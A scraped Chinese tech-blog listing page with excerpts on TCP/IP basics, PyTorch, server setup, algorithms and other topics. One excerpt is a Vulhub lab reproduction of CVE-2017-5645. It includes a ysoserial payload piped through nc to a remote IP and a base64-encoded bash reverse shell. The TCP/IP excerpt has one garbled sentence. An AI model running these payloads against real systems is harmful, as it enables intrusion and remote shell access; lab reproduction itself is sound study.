数据进入协议栈的封装过程如下：
UDP数据与TCP数据基本一致，UDP传给IP的需不需大白天哑巴称作UDP数据报。首部长为8字节。
IP在生成的IP首部要加入标识表示数据属于哪一层。IP的首部中存入一个长度为8bit的数值称为协议域。1表示为ICMP协议,2表示为IGMP协议，6表示为TCP协议，17表示为UDP协议。
运输层协议在生成报文首部时也要存入一个应用程序的标识符。TCP和UDP都用一个16bit的端口号来表示不同的应用程序。TCP和UDP把源端口号和目的端口号分别存入报文首部中。
网络接口这里也必须在以太网帧的首部中加入某种形式的表示用来指明生成数据的网络层协议。以太网帧首部是一个16Bit的帧类型域。
四、分用 分用，就是当目的主机收到一个以太网数据帧时，数据就开始从协议栈中由底向上升，同时去掉各层协议加上的报文首部，每层协议和都要去检查报文首部中的协议表示，用来确定接收数据的上层协议。分用过程如下图：
五、端口号 服务器一般都是通过知名端口号来识别的，TCP/IP实现来说。FTP服务器的TCP端口号为21，Telnet服务器的TCP端口号为23，每个TFTP服务器的UDP的端口号为69。现在TCP/IP实现所提供的服务都用的知名的1-1023之间的端口号。
六、RFC 系列以编号排定的文件。文件收集了有关互联网相关信息，以及UNIX和互联网社区的软件文件。RFC文件是由Internet Society（ISOC）赞助发行。基本的互联网通信协议都有在RFC文件内详细说明。RFC文件还额外加入许多在标准内的论题，例如对于互联网新开发的协议及发展中所有的记录。因此几乎所有的互联网标准都有收录在RFC文件之中。
罗列一些重要的RFC文档：
1.赋值RFC（Assigned Numbers RFC）列出了所有internet协议中使用的数字和常数。
2.Internet正式协议标准，这个RFC描述了各种Internet协议的标准化现状。每种协议都处于下面几种标准化状态之一：标准、草案标准、提议标准、实验标准、信息标准和历史标准。
3.主机需求RFC。如果要查看有关协议更详细的细节内容，它们通常是一个入口点。它们列出了协议中关于“必须”、“应该”、“可以”、“不应该”或者“不能”等特性及其实现细节。
4.路由器需求RFC。它与主机需求RFC类似，但是只单独描述了路由器的需求。
七、标准的简单服务 当使用 TCP和UDP提供相同的服务时，一般选择相同的端口号。
可以发现端口号都是奇数，原因其实就是他们的前身就是NCP协议，NCP协议是单工的，于是每个应用程序需要两个连接，需要预留一对奇数和偶数的端口号，TCP和UDP成为标准的运输层协议时只用一个端口号就够了，于是就都用了奇数了。
八、互联网 internet意思是一个共同的协议族把多个网络连接在一起，而Internet是指的世界范围内通过TCP/IP互相通信的所有主机集合。Internet是一个internet，但internet不等于Internet。
九、实现 这个图列举了各种版本BDS并标注了重要的TCP/IP特性，左边为BSD网络版，其所有的网络源代码可以公开得到（包括协议本身以及许多应用程序和工具）
十、应用编程接口 使用TCP/IP协议的应用程序通常采用两种应用编程接口（API）：socket和TLI（运输层接口：Transport Layer Interface）。
总结 今天主要学习了TCP/IP协议族，介绍了许多术语和协议。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f641c4a366fd95354bd5139c93dd6d11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f4f8fff8b16a7dc77f620e8cb76885ef/" rel="bookmark">
			pytorch之常用函数整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pytorch之常用函数整理 一、图像预处理函数1.1 torchvision.datasets.ImageFolder()函数 二、参数优化函数2.1 torch.optim.lr_scheduler.StepLR()函数2.2 optimizer.param_groups参数 三、模型保存与加载3.1 模型和模型参数保存torch.save()函数3.2 模型加载torch.load()函数3.3 模型参数加载model.load_state_dict()函数3.3.1 model.state_dict()函数和optimizer.state_dict()函数 3.4 总结模型参数保存与加载3.4.1 保存整个模型参数3.4.2 加载模型参数3.4.3 保存阶段性模型训练过程3.4.4 加载阶段性模型训练过程3.4.5 保存/加载多个模型到一个文件3.4.6 加载其他模型3.4.7 跨设备保存与加载模型3.4.7.1 GPU上保存，CPU上加载3.4.7.2 GPU上保存，GPU上加载3.4.7.3 CPU上保存，GPU上加载 四、其他函数4.1 torch.randperm函数 一、图像预处理函数 1.1 torchvision.datasets.ImageFolder()函数 ImageFolder函数假设所有的文件按文件夹保存，每个文件夹下存储同一类别的图片，文件夹名为类别名； ImageFolder(root, transform=None, target_transform=None, loader=default_loader) """ 参数解释： 1）root：图片存储根目录； 2）transform：对PIL Image进行的转换操作，原始图片作为输入，返回一个转换后的图片； 3）target_transform：对图片类别进行预处理的操作，输入为 target，输出对其的转换。如果不传该参数，即对 target 不做任何转换，返回的顺序索引 0,1, 2…； 4）loader：表示数据集加载方式，通常默认加载方式即可； 返回值： self.classes：用一个 list 保存类别名称； self.class_to_idx：类别对应的索引，与不做任何转换返回的 target 对应； self.imgs：保存(img-path, class) tuple的 list； """ from torchvision import transforms from torchvision.datasets import ImageFolder transform = transforms.Compose([ transforms.RandomResizedCrop(224), transforms.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f4f8fff8b16a7dc77f620e8cb76885ef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1585d1e73e2b4f8741c6cce924958f7c/" rel="bookmark">
			CentOS7通过yum安装httpd和php8.0
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、配置firewalld二、安装httpd三、安装php8.0四、修改httpd配置五、修改php配置总结 前言 为了安装kodexplorer必须得部署php环境，所以首次接触了下php
记录一下自己安装php80并与httpd整合的过程
操作全是使用root权限进行操作
一、配置firewalld CentOS7默认使用firewall来配置防火墙
如果没有安装，则使用yum进行安装
yum install -y firewalld 启动服务
systemctl start firewalld 设置开机自启动
systemctl enable firewalld firewall的配置文件是以xml的格式，存储在 /usr/lib/firewalld/ 和 /etc/firewalld/ 目录中
可以通过命令行或者直接修改配置文件的方式修改firewall的配置
这里通过开放一下httpd和php80的端口
firewall-cmd --permanent --zone=public --add-port=80/tcp 重新加载防火墙
firewall-cmd --reload 二、安装httpd 使用yum直接安装。
yum install -y httpd 安装完成后启动服务
systemctl start httpd 查看httpd状态（没修改配置的话一般都能启动成功，配置我们后面再改）
systemctl status httpd 设置开机自启动
systemctl enable httpd 查看httpd版本（CentOS7 yum 安装的httpd版本目前是Apache/2.4.6）
httpd -V | head -n 1 这里可以通过自己创建个index文件简单验证一下服务是否正常
echo "test" &gt; /var/www/html/index.html 打开浏览器可以看到我们的测试主页（我使用的服务器IP是192.168.1.21）
通过yum安装的httpd默认文件和存放的目录是
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1585d1e73e2b4f8741c6cce924958f7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2734d74c0c9df6fee805b4cd2268a1bd/" rel="bookmark">
			leetCode 94. 二叉树的中序遍历
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个二叉树的根节点 root ，返回 它的 中序 遍历 。
示例 1：
输入：root = [1,null,2,3]
输出：[1,3,2]
示例 2：
输入：root = []
输出：[]
示例 3：
输入：root = [1]
输出：[1]
定义 inorder(root) 表示当前遍历到 root 节点的答案，那么按照定义，我们只要递归调用 inorder(root.left) 来遍历root 节点的左子树，然后将 root 节点的值加入答案，再递归调用inorder(root.right) 来遍历 root 节点的右子树即可，递归终止的条件为碰到空节点
/** * Definition for a binary tree node. * function TreeNode(val, left, right) { * this.val = (val===undefined ? 0 : val) * this.left = (left===undefined ? null : left) * this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2734d74c0c9df6fee805b4cd2268a1bd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca3f99f4f7d3996e2104028b1b1a63c1/" rel="bookmark">
			k8s mellanox网卡使用dpdk驱动问题总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文主要总结一下在k8s环境中，mellanox网卡使用dpdk driver可能会遇到的问题及解决办法。
1. 不能挂载 /sys 目录到pod中
其他厂家的网卡，比如intel的x710等，如果想在k8s中，使用dpdk driver，/sys目录是必须挂载的，因为dpdk启动过程会读取这个目录下的文件。但是对于mellanox网卡来说，它是比较特殊的，在使用dpdk driver时，也必须绑定在kernel driver mlx5_core上面。
如果挂载了 /sys 目录到pod中，就会报如下的错误。
net_mlx5: port 0 cannot get MAC address, is mlx5_en loaded? (errno: No such file or directory) net_mlx5: probe of PCI device 0000:00:09.0 aborted after encountering an error: No such device EAL: Requested device 0000:00:09.0 cannot be used 原因是 host上的 /sys/ 会覆盖 pod 里的 /sys/ 内容，而 mlx 网卡会读取这些目录，比如 /sys/devices/pci0000:00/0000:00:09.0/net/，如果覆盖了，就会报错。下面分析下代码
mlx5_pci_probe mlx5_dev_spawn /* Configure the first MAC address by default.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca3f99f4f7d3996e2104028b1b1a63c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11963800bf57dd2fd9ff547ea0866998/" rel="bookmark">
			根据模板导出数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/** * 下载 导入错误信息表 * * @param response * @param data * @throws Exception */ public void exportPublicity (HttpServletResponse response, ApiResponse &lt;?&gt; data) { List &lt;GysExcelErrorVo&gt; list= "将要导出的数据"; String base64= "我这里将模板转成base64了"; File file1=base64ToFile ( base64 ); InputStream is=null; XSSFWorkbook workbook=null; XSSFSheet sheet=null; try { is=new FileInputStream ( file1 );// 将excel文件转为输入流 workbook=new XSSFWorkbook ( is );// 创建个workbook， // 获取第一个sheet sheet=workbook.getSheetAt ( 0 ); } catch (Exception e1) { e1.printStackTrace ( ); } if (sheet !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/11963800bf57dd2fd9ff547ea0866998/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92858fbe1fc5ce09de4290b07437fdc0/" rel="bookmark">
			Typora输入卡顿解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近写文档写到1万词左右时就会出现很严重的卡顿，输入法打字都不能实时看到打上去的字母了，汉字也要好一会才显示上去
解决办法是使用微软拼音输入法之外的输入法。
原因是微软拼音输入法会将输入的字母全部打到Typora上去，之后再替换为汉字。而这样会造成卡顿，特别是勾选了Typora自动保存时。
同时，不要开启兼容性：
（路径为右键任务栏微软拼音输入法图标–&gt;设置–&gt;选项–&gt;常规–&gt;兼容性）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55a8f0a1ccfb2ab6ff7fa4a40fccac63/" rel="bookmark">
			玩转C#网页抓取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网页抓取是通过自动化手段检索数据的过程。它在许多场景中都是不可或缺的，例如竞争对手价格监控、房地产清单列表、潜在客户和舆情监控、新闻文章或金融数据聚合等。 如果您想了解更多相关信息，可以前往Oxylabs中文官网Oxylabs.cn参见我们的文章“网络抓取合法吗？”
在编写网页抓取代码时，您要做出的第一个决定是选择您的编程语言。您可以使用多种语言进行编写，例如Python、JavaScript、Java、Ruby或C#。所有提到的语言都提供强大的网络抓取功能。
在本文中，我们将探索C#并向您展示如何创建一个真实的C#公共网络爬虫。请记住，即使我们使用C#，您也可以将此信息调整为.NET平台支持的所有语言，包括VB.NET和F#。
01.C#网页抓取工具 在编写任何代码之前，第一步是选择合适的C#库或包。这些C#库或包将具有下载HTML页面、解析它们以及从这些页面中提取所需数据的功能。一些最流行的C#包如下：
●ScrapySharp
●Puppeteer Sharp
●Html Agility Pack
Html Agility Pack是最受欢迎的C#包，仅Nuget就有近5,000万次下载。其流行有多种原因，其中最重要的原因是该HTML解析器能够直接或使用浏览器下载网页。这个包可以容忍格式错误的HTML并支持XPath。此外，它甚至可以解析本地HTML文件；因此，我们将在本文中进一步使用这个包。
ScrapySharp为C#编程添加了更多功能。这个包支持CSS选择器并且可以模拟网络浏览器。虽然ScrapySharp被认为是一个强大的C#包，但程序员使用它进行维护的概率并不是很高。
Puppeteer Sharp是著名的Node.js Puppeteer项目的.NET端口。它使用相同的Chromium浏览器来加载页面。此外，这个包采用了async-await风格的代码，支持异步及预操作管理。如果您已经熟悉这个C#包并且需要一个浏览器来呈现页面，那么Puppeteer Sharp可能是一个不错的选择。
02.使用C#构建网络爬虫 如前所述，现在我们将演示如何编写将使用Html Agility Pack的C#公共网络抓取代码。我们将使用带有Visual Studio Code的.NET 5 SDK。此代码已在 .NET Core 3和.NET 5上测试过，它应该适用于其他版本的.NET。
我们将设置一个假设的场景：爬取一家在线书店并收集书名和价格。
在编写C#网络爬虫之前，我们先来设置下开发环境。
03.设置开发环境 对于C#开发环境，请安装Visual Studio Code。请注意，如果您使用Visual Studio和Visual Studio Code编写C#代码，则需要注意它们是两个完全不同的应用程序。
安装Visual Studio Code后，安装.NET 5.0或更高版本。您还可以使用.NET Core 3.1。安装完成后，打开终端并运行以下命令以验证.NET CLI或命令行界面是否正常工作：
dotnet --version 该行命令会输出安装的.NET的版本号。
04.项目结构和依存关系 该代码将成为.NET项目的一部分。为简单起见，创建一个控制台应用程序。然后，创建一个文件夹，您将在其中编写C#代码。打开终端并导航到该文件夹。输入以下命令：
dotnet new console 此命令的输出应该是已成功创建控制台应用程序的信息。
到时间安装所需的软件包了。使用C#抓取公共网页，Html Agility Pack将是一个不错的选择。您可以使用以下命令为该项目安装它：
dotnet add package HtmlAgilityPack 再安装一个包，以便我们可以轻松地将抓取的数据导出到CSV文件：
dotnet add package CsvHelper 如果您使用的是Visual Studio而不是Visual Studio Code，请单击文件，选择新建解决方案，然后按控制台应用程序按钮。要安装依赖项，请按照下列步骤操作：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55a8f0a1ccfb2ab6ff7fa4a40fccac63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/658823ce84222b8e089a85cff3eed1f7/" rel="bookmark">
			不求人小白也能搭建私有云盘，焕然一新体验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		各位同学有没有这样的经历：百度网盘、阿里云盘等公有云网盘玩腻了，想自己搞一个私有云盘试试，体验一把自己当管理员自由分享和分配账号的快感。好不容易决定自己搭建一个试试，结果各种出师未捷身先死，过程不对，这里那里报错，然后没办法各种混论坛求大佬。
私有云盘搭建其实并没有那么难，选对方式方法，小白不求人也能自己搭建私有云盘。
不需要写一行代码，不需要什么专业技术，不用懂太多东西，按照教程走，就能搭建一个自己的私有云盘。
话不多数直接上教程，一起来操作起来：
首先拿出你的电脑。
然后打开浏览器，搜索阿里云，并登录阿里云账号，没有的童鞋，可以打开你的支付宝扫码登录（注意：需要完成实名认证才可以进行下面的操作）
接着去工作台开通serverless函数计算FC和文件存储NAS服务
开通服务后进入工作台的应用中心，选择通过模板创建应用，找到kodbox
点击立即创建
然后选择直接部署，除了*角色名称那部分需要去完成授权操作，其他部分保持不动就可以了
完成授权之后点击页面最下面的创建按钮
最后，创建完成，可以看到访问域名。后面可以随时随地通过这个域名来访问私有网盘。会操作的同学，也可以自己绑定下自己的域名。
点击上面提供的域名，输入admin/admin（账号/密码），就可以登录系统了。
因为这个账号密码是系统默认的，登录后要尽快修改一下。
到这里网盘的部署已经完成了。怎么样，是不是很简单呢！小白也能像安装APP一样部署私有云盘，妈妈再也不用担心我的ABC，咱也是能部署云盘的人才了（骄傲）！
这个网盘界面有没有很熟悉好用炫酷.....可道云网盘是国产开源网盘（个人认为几乎是目前市面上前端体验最好的网盘），有类似windows的图形界面、甚至还整合了一些macOS的特点，常见的框选、拖拽移动文件、鼠标右键、压缩解压、各种快捷键、鼠标+快捷键组合快捷键操作都是支持的，可以说使用起来毫不费力。
可道云网盘还提供了云桌面，可以根据自己的喜好来装扮一下网盘，放一些轻应用，或者随心情切换个壁纸主题啥的。文件格式支持也非常多，可以在线看文档、看视频、听音乐、压缩包甚至电子书、流程图等等。论坛比较活跃，有不少爱好者开发的第三方插件，可玩性也非常不错。更多特性自己体会吧。
P.s. 这个网盘部署是免费的，后面使用会有请求和一定的存储和流量费用，但是相对ECS会便宜很多。具体可以自己查询下阿里云相关介绍。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8be70476442ab015f03c305f884fd35/" rel="bookmark">
			【threejs 】添加标签和射线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		three 添加标签 应用 上一篇文章我们说了世界坐标和屏幕坐标的准换那么有什么应用呢？ 应用 可以实现该效果：鼠标移动该模块的时候展示该模块的标签。或者可以常显，射线就是当鼠标移动到该模块该模块变化颜色
创建一个标签js文件作为封装的方法
// 创建一个HTML标签 function tag() { // 创建div元素(作为标签) var div = document.createElement('div'); div.style.visibility = 'hidden'; div.innerHTML = 'GDP:'+0; div.style.padding = '4px 10px'; div.style.color = '#fff'; div.style.fontSize = '16px'; div.style.position = 'absolute'; div.style.backgroundColor = 'rgba(25,25,25,0.5)'; div.style.borderRadius = '5px'; // 该上面设置的发小都是屏幕坐标大小 //div元素包装为CSS2模型对象CSS2DObject var label = new CSS2DObject(div); div.style.pointerEvents = 'none';//避免HTML标签遮挡三维场景的鼠标事件 // 设置HTML元素标签在three.js世界坐标中位置 // label.position.set(x, y, z); return label;//返回CSS2模型标签 } // 创建一个CSS2渲染器CSS2DRenderer var labelRenderer = new CSS2DRenderer(); labelRenderer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8be70476442ab015f03c305f884fd35/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c1bf64ad96ee48aad501374773c840d/" rel="bookmark">
			数据结构——查找
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查找 查找：在数据集合中寻找满足某种条件的数据元素的过程称为查找。查找结果一般分为两种即，查找成功查找失败。
查找表(查找结构)：用于查找的数据集合称为查找表，可以是一个数组或链表等数据类型
静态查找表：若一个查找表的操作仅涉及查询某种元素是否在表中或者检索满足某种特性的数据元素的各种属性，则称该表为静态查找表。(若存在查找插入操作以及删除操作等修改了表，则不是静态查找表，反之我们称为动态查找表)
关键字：数据元素中唯一表示该元素的某个数据项的值，使用基于关键字查找，查找结果应该是唯一的
平均查找长度：在查找过程中，一次查找长度是指需要比较的关键字次数，而平均查找长度则是所有查找过程中进行关键字比较次数的平均值，其数字定义为
A S L = ∑ i = 1 n P i C i ASL = \sum^n_{i = 1}P_iC_i ASL=i=1∑n​Pi​Ci​
n — — 查 找 表 长 度 ， P i 查 找 第 i 个 元 素 的 概 率 ( P i = 1 / n ) ， C i 找 到 第 i 个 元 素 的 平 均 次 数 n——查找表长度，P_i查找第i个元素的概率(P_i = 1/n)，C_i 找到第i个元素的平均次数 n——查找表长度，Pi​查找第i个元素的概率(Pi​=1/n)，Ci​找到第i个元素的平均次数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1c1bf64ad96ee48aad501374773c840d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d19af00a889f99bc1bbd57d3fd7e2ceb/" rel="bookmark">
			C语言：结构体中链表的添加与删除
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C语言中的链表作为一个重要的知识点，我觉得在进行链表的相关操作时首先要理解链表分三种，单向链表、双向链表、循环链表。
虽然说是三种，但其实本质都是一样的，就是在一个结构体里面有数据域和指针域，数据域中用来描述节点的信息，而指针域中用来指向上一个节点或者下一个节点。
分为按值添加和按位置添加
说明：
此添加、删除为按值添加、删除
下面请看代码：
添加分为链表中头节点的插入
在中间插入
尾插入
删除也分为头删除
中间删除
尾删除
一些细节上的处理：
传参时，如果要改变头节点，就传二级指针，不需要改变头节点，就传一级指针
单链表中有很多函数都需要分类导论，要考虑它只有一个节点或没有节点的极端情况
注意在不需要改变头节点时，万万不能随便解引用头节点以及连续写两个-&gt;next时，因为这种情况下很容易出现问题
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; typedef struct Node { int id; char* name; struct Node* pNext; }List; void AddNode(List** pphead, List** ppend, int id, char* name) { List* ptemp =(List*) malloc(sizeof(List)); ptemp-&gt;id = id; ptemp-&gt;name = name; ptemp-&gt;pNext = NULL; if (*pphead == NULL) { *pphead = ptemp; } else { (*ppend)-&gt;pNext = ptemp; } *ppend = ptemp; } void InsertNode(List** pphead, List** ppend, List* pNode, int n) { List* pmark = *pphead; if ((*pphead)-&gt;id == n) { pNode-&gt;pNext = *pphead; *pphead = pNode; } while (pmark !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d19af00a889f99bc1bbd57d3fd7e2ceb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56d233865897fa70873451c33736cee5/" rel="bookmark">
			深拷贝与浅拷贝
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		浅拷贝 浅拷贝只复制某个对象的引用，而不复制对象本身，新旧对象还是共享同一块内存
实现 1.直接赋值 基本数据类型赋值过程都是浅拷贝的过程
2.Object.assign() let a={}; let b={c:{d:1}}; Object.assign(a,b); console.log(a); //{c:{d:1}} //Object 注意事项 //1.它不会拷贝对象的继承属性 //2.它不会拷贝对象的不可枚举属性 //3.可以拷贝Symbol类型的属性 3.Array.prototype.concat() 4.Array.prototype.slice() 5.手动实现 function shallowCopy(object) { // 只拷贝对象 if (!object || typeof object !== "object") return; // 根据 object 的类型判断是新建一个数组还是对象 let newObject = Array.isArray(object) ? [] : {}; // 遍历 object，并且判断是 object 的属性才拷贝 for (let key in object) { if (object.hasOwnProperty(key)) { newObject[key] = object[key]; } } return newObject; } 深拷贝 深拷贝会创造一个一摸一样的对象，新对象和原对象不共享内存，修改新对象不会改变原对对象
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/56d233865897fa70873451c33736cee5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e432e59010f8fb257e3146bca306db29/" rel="bookmark">
			Java中a&#43;&#43; 和 &#43;&#43;a的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 a++是先计算，执行语句之后，再+1，++a是先+1，再运算。
例子代码：
public class Test { public static void main(String[] args) { int a = 10; int b = 10; //a++ 输出20 此时a的值是10，参与运算+10，得到20，执行输出语句，输出20，然后a再加1 System.out.println(a++ + 10); //++b 输出21 此时b的值为10，先加一，得到11，然后参与运算+10得到21，输出 System.out.println(++b + 10); } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8da051804945d9ca352d9a595fd3a394/" rel="bookmark">
			卷积神经网络 —— 深度学习基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深度学习的基本思想 在原始的数据中，往往存在一些没用的、冗余的信息，它们在模型的训练中起到很小的作用，却占用大多的训练时间，甚至还会使得模型学习到一些不想干的特征，从而会影响到模型的性能。因此，我们需要从原始数据中选择出一些比较好的，对预测结果影响大的特征。
例如，在波士顿房价数据集中，一氧化氮的浓度、每栋住宅的平均房间数、低收入人口的比例对房价有着更加直接的影响。
仅选择这三个特征来预测房价，就可以得到一个比较好的结果。而其他的因素对房价的影响并不大，要注意的是，即使对于同样的数据，实现不同的任务，对于好的特征的选择也是不同的。
例如，
推选学习标兵，
就是重要的特征，其他特征则不是很重要。
选美活动，
就是重要的特征，其他特征则不是很重要。
原始的数据通常描述的是低级别的特征，有时候为了得到好的预测结果，我们需要从中抽象出更高层次的特征，然后把这样的经过加工的特征送入机器学习算法中去训练模型，在机器学习中，特征的选择和设计非常重要。如果使用好的特征，那么即使使用比较简单的模型，也能够得到优秀的结果。
在传统的机器学习中，首先通过特征工程来选择并设计出最适合当前任务的特征，然后把它们送入学习器，
进行分类或者回归。
特征工程对机器学习的效果起到非常关键的作用，会极大的影响结果的优劣，甚至决定整个任务的成败。
因此，特征工程往往是整个项目中的关键。需要花费大量的工作。
有人说，数据和特征决定了机器学习的上限，而模型和算法只是逼近这个上限而已。
传统的特征工程依靠人工方式提取和设计特征，需要大量的专业知识和经验。特征的好坏在很大程度上依靠经验和运气，而且和具体的任务密切相关。
对于特定的任务，需要通过大量的工作，设计出适合该任务的特征，因此，特征的计算、调整、测试都需要大量的时间。
既然这种人工选取特征的方式十分费事费力，那么能否让机器自动的学习特征呢？
下图是我们在之前实现的鸢尾花分类的神经网络 ，
通过隐含层，将输入的四维数据转化为一个16维的数据，并通过 Relu 函数提取特征，然后在输出层，通过 Softmax 函数进行分类，其实，在全连接神经网络中，隐含层的作用就是提取特征。每经过一层隐含层，都可以看做是一次特征转换。因此，神经网络的隐含层也被称为特征层。
深度神经网络就是有着多层隐含层的神经网络。这些隐含层不断的对输入的低层特征进行组合，形成更加抽象的高层特征，最后使用一个 Softmax 分类器进行分类。
其实，神经网络可以看做是一种自动提取特征的方法。模型参数的初始值是随机选取的，因此，一开始提取出的特征肯定是非常不靠谱的。但是，在每次训练之后，都会逐层反向传递误差，自动调整神经网络中的模型参数。
这样，经过多轮训练之后，提取出的特征就越来越好了。可以正确的完成分类。
使用神经网络，特征工程就没有那么重要了，只需要对原始数据做一些必要的预处理之后，把它们直接喂入神经网络中，通过训练，自动的调整权值，使得预测的结果符合预期的要求。这种方式称为 端到端学习。
在一个训练好的神经网络模型中，低层隐含层的输出是更接近原始输入数据的低层特征，随着层数的增加，提取出的特征越来越抽象，表达能力也就越好。因此，神经网络中隐含层层数越多，效果也就越好，这种具有多个隐含层的深层神经网络，就是深度学习。
深度学习能够自动的从数据中学习到与任务相关的特征，从而避免了手工设计特征这项费事费力的繁琐低效的工作。但是，通过网络自动提取出的特征缺乏可解释性，不像手工设计的特征有明确的意义。
有人说，深度学习使得人工智能真正的落地，因为之前的人工智能在很多情况下，用不起来。人工设计的智能还是比较难于超越人类，而深度学习则把这一过程（人工智能）变成了数据驱动的过程，
目前落地的大部分人工智能产品大部分都是基于深度学习做出来的。例如，语音识别、计算机视觉等。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fecfa35989c8b191c13a9a2dfaacff1a/" rel="bookmark">
			【Vulhub】Apache Log4j Server 反序列化命令执行漏洞复现(CVE-2017-5645)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		脚本小子上线啦，开始复现以前出现实战环境的漏洞了，我会记录一些复现的漏洞（不会是全部），今天这个漏洞的原理我也不太会就知道是个Java反序列化的洞，只负责复现（脚本小子~）。
漏洞介绍&amp;环境搭建简单介绍 Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。（当然是借鉴其它师傅的总结）
ysoserial jar脚本工具下载（执行脚本需要Java环境）：
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
环境搭建就不说了，这个Vulhub网站有基础搭建介绍，搭建主要就两步，第一步是把Vulhub源码拖入我们的服务器，当然也可以在VMware虚拟机，我这边用的是服务器，第二步就是创建docker镜像（前提是服务器或者VMware有docker，没有自行下载）。
进入目标CVE版本的洞，直接创建docker命令两条如下： docker-compose build
docker-compose up -d
之后docker ps查看镜像映射的端口就行了（记得服务器的端口要开发哈）。
开始复现 复现挺简单的，主要是了解一下这个洞，用脚本感觉学不到啥东西（除非深入其漏洞原理）。利用ysoserial的CC链攻击对4712端口直击心脏。一把梭了其实（脚本回自动生成payload，如何我们利用管道将其发送到4712端口），如下：
java -jar ysoserial-master-91b4266b13-1.jar CommonsCollections5 "mkdir /tmp/errorr0" | nc 47.106.108.66 4712 后面是命令执行，我们用mkdir指令在docker容器/tmp中创建一个errorr0的文件夹。然后我们进入docker中看看执行成功了吗？
docker exec -it 容器ID /bin/bash
可以看到，成功了，因此漏洞复现基本上就算成功了。接下来试试反弹shell，注意虽然我下面用的都是我自己的服务器，但是反弹shell的是4712端口，对应的是docker容器。
我用的反弹shell指令与网上师傅们是相同的（base64编码如下），当然自己也试过直接bash，在docker容器中直接测试还可以，就是不晓得用脚本生成的payload为啥不能直接bash。
java -jar ysoserial-master-91b4266b13-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDYuMTA4LjY2LzY2NjYgMD4mMQo=}|{base64,-d}|{bash,-i}" | nc 47.106.108.66 4712 到这里漏洞复现基本完成。
最后针对这个漏洞修复有啥建议？no，没有，我也不太懂原理，主要是了解一下这个漏洞怎么利用哈哈，看了好几篇网章的师傅们都说是建议更新apache的版本（salute！！）。
参考：Apache Log4j Server 反序列化命令执行漏洞（CVE-2017-5645）复现_锋刃科技的博客-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c853d5376a0701d31e57a203cecc1ea/" rel="bookmark">
			Pinia快速入门-上手指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
